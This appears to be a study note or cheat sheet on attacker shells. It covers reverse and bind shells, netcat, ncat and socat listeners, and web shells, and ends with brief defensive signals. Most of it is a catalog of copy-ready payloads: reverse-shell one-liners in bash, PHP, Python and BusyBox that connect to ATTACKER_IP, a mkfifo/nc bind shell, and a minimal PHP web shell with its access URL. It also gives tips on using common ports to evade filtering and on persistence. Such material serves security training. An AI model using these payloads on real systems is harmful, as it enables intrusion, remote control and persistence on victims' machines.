# Shells Overview

## Shell (general)

- A *shell* is an interface to an OS (CLI is typical). In offensive security it usually means an interactive session an attacker obtains on a compromised host.
- Common attacker uses: remote command execution, privilege escalation, data exfiltration, persistence (backdoors, hidden accounts), post-exploitation tooling, and lateral movement/pivoting.
- Important tradeoffs: stealth (blend with legitimate traffic), reliability (incoming vs outgoing connections), and requirement for elevated privileges (ports <1024, service accounts, etc.).

## Reverse shell (connect-back)

- **Definition:** the *target* initiates a connection to the *attacker* (listener). Good for bypassing outbound firewall restrictions that allow web/standard ports.
- **Typical listener:** `nc -lvnp 443` (listen `l`, verbose `v`, no DNS `n`, port `p`).
- **Why attackers pick ports:** use common ports (53, 80, 443, 8080, 139, 445) to blend in and evade IDS/IPS.
- **Example (pipe reverse shell):**
    
    ```bash
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
    ```
    
    - Creates FIFO `/tmp/f` to enable bidirectional I/O, starts an interactive shell `sh -i`, and forwards IO over `nc`.
- **When to use:** target can make outbound connections; generally more stealthy than bind shells.

## Bind shell

- **Definition:** the compromised host *binds* a port and listens; the attacker connects to that port to get a shell.
- **Example (target runs):**
    
    ```bash
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
    ```
    
    - `nc -l 0.0.0.0 8080` listens on all interfaces; `/tmp/f` enables bidirectional communication.
- **Attacker connect:** `nc -nv TARGET_IP 8080`
- **Tradeoffs:** useful if outbound traffic from target is blocked; less stealthy (open listening port is fingerable), must remain active on the host.

## Listeners / interaction helpers

- **rlwrap:** wraps `nc` to provide readline features (history, arrow keys). Example: `rlwrap nc -lvnp 443`.
- **ncat (Nmap):** Netcat replacement with extras (SSL, improved features). Examples:
    - `ncat -lvnp 4444`
    - `ncat --ssl -lvnp 4444` (adds TLS).
- **socat:** flexible socket relay/forwarding tool. Example: `socat -d -d TCP-LISTEN:443 STDOUT` for verbose TCP listener.
- **Recommendation:** use rlwrap or `python -c 'import pty; pty.spawn("/bin/bash")'` after connecting to get a proper interactive TTY (job control, Ctrl-C, etc.).

## Shell payloads — quick catalog (Linux)

### Bash

- Simple TCP shell: `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`
- Variants use alternate file descriptors or `exec` loops to maintain interactivity and stability.

### PHP (web-context)

- Inline reverse shell examples using `fsockopen` + `exec`/`system`/`popen`/`shell_exec`.
    
    Example: `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`
    
- Useful when attacker can execute PHP on a web server (file upload, RCE).

### Python

- Socket + `os.dup2()` then `pty.spawn("bash")` to switch stdio to socket.
    
    Example short: `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
    

### Others

- **Telnet / BusyBox / AWK** — quirky but effective alternatives on constrained systems.
    
    Example BusyBox: `busybox nc ATTACKER_IP 443 -e sh`
    
- **Notes:** choose based on available interpreters/utilities on target and detection risk.

## Web shells

- **Definition:** server-side script (PHP/ASP/JSP/CGI) that executes commands via HTTP requests; often persisted in webroot.
- **Minimal PHP example:**
    
    ```php
    <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
    ```
    
    - Access: `http://victim/uploads/shell.php?cmd=whoami`
- **Capabilities:** remote command execution, file management, upload/download, proxying, pivoting.
- **Popular single-file PHP shells:** p0wny-shell (minimal), b374k (feature-rich), c99 (extensive). (These are widely circulated tools for post-exploitation.)
- **Detection challenge:** blends with normal web traffic; often hidden in uploads or existing app files.

## Practical guidance / operational notes (concise)

- **Reverse vs Bind:** use reverse shells when outbound connections are permitted; use bind when outbound is blocked but inbound is allowed.
- **Port choice:** use well-known ports to evade basic filtering; ports <1024 require elevated privileges.
- **Stability:** convert raw `nc` shells into a proper TTY (`python -c 'import pty; pty.spawn("/bin/bash")'`) and/or use `rlwrap`.
- **Persistence & stealth:** attackers create backdoors/web shells or scheduled tasks for persistence; defenders should monitor new listeners, unusual outbound connections, and suspicious file uploads.
- **Defensive signals:** unexpected `mkfifo`, spawned `nc`/`ncat` processes, new web files in uploads, unexpected listeners on common ports.
